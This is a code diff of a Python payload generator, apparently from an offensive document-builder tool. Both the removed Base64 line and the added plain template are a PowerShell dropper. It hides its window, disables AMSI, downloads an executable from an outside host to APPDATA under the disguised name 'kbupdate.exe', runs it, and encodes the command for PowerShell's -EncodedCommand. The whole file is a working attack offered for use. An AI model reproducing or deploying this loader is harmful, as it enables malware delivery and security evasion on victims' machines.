@@ -1,2 +1,27 @@
-#  payloads for this builder are to be accepted as PowerShell encoded commands, so they must be powershell code encoded as UTF16-LE Base64
-payload_list = ['/v8AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwBJAGYAIAAoAHQAZQBzAHQALQBwAGEAdABoACAAIAAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQAgACsAIAAnAFwAawBiAHUAcABkAGEAdABlAC4AZQB4AGUAJwApACAAewBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBACAAKwAgACcAXABrAGIAdQBwAGQAYQB0AGUALgBlAHgAZQAnAH0AOwAgACQATwBFAEsAUQBEACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAgACQATwBFAEsAUQBEAC4ASABlAGEAZABlAHIAcwBbACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnAF0AIAA9ACAAJwBSAEwARQAtAFQARQAnADsAIAAkAE8ARQBLAFEARAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwAHMAOgAvAC8AYwB5AGIAZQByAHMAdwBlAGEAdAAuAHMAaABvAHAALwBMAEwALwB1AHAAZABhAHQAZQAuAGMAYQBiACcALAAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBACAAKwAgACcAXABrAGIAdQBwAGQAYQB0AGUALgBlAHgAZQAnACkAOwAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AYwBvAG0AIABTAGgAZQBsAGwALgBBAHAAcABsAGkAYwBhAHQAaQBvAG4AKQAuAFMAaABlAGwAbABFAHgAZQBjAHUAdABlACgAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAIAArACAAJwBcAGsAYgB1AHAAZABhAHQAZQAuAGUAeABlACcAKQA7ACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAEkAZAAgACQAUABpAGQAIAAtAEYAbwByAGMAZQ==']
+import base64
+
+def get_payloads():
+    template = '''powershell.exe -WindowStyle Hidden -noprofile [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);If (test-path  $env:APPDATA + '\localfilename') {Remove-Item  $env:APPDATA + '\localfilename'}; $OEKQD = New-Object System.Net.WebClient; $OEKQD.Headers['User-Agent'] = 'user_agent'; $OEKQD.DownloadFile('my_download_url', $env:APPDATA + '\localfilename'); (New-Object -com Shell.Application).ShellExecute($env:APPDATA + '\localfilename'); Stop-Process -Id $Pid -Force'''
+
+    my_download_url = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe'
+    my_user_agent = 'EMT-KL'
+    my_local_file_name = 'kbupdate.exe'
+
+    payload = template.replace('localfilename', my_local_file_name)
+    payload = payload.replace('my_download_url', my_download_url)
+    payload = payload.replace('user_agent', my_user_agent)
+
+
+    # payloads for this builder are returned as UTF16-LE encoded data that is base64 encoded. This is the format
+    # compatible with PowerShell's -encodedcommand input
+    encoded_payload = base64.b64encode(bytearray(payload, encoding='UTF-16LE')).decode('UTF-8')
+
+    return [encoded_payload]  # always return a list - limit the list to one entry if you want to choose a specific
+                              # payload instead of a random one
+
+#  run this script directly to see what you will return for payloads
+
+
+if __name__ == '__main__':
+    for i in get_payloads():
+        print(base64.b64decode(i).decode('UTF-8'))
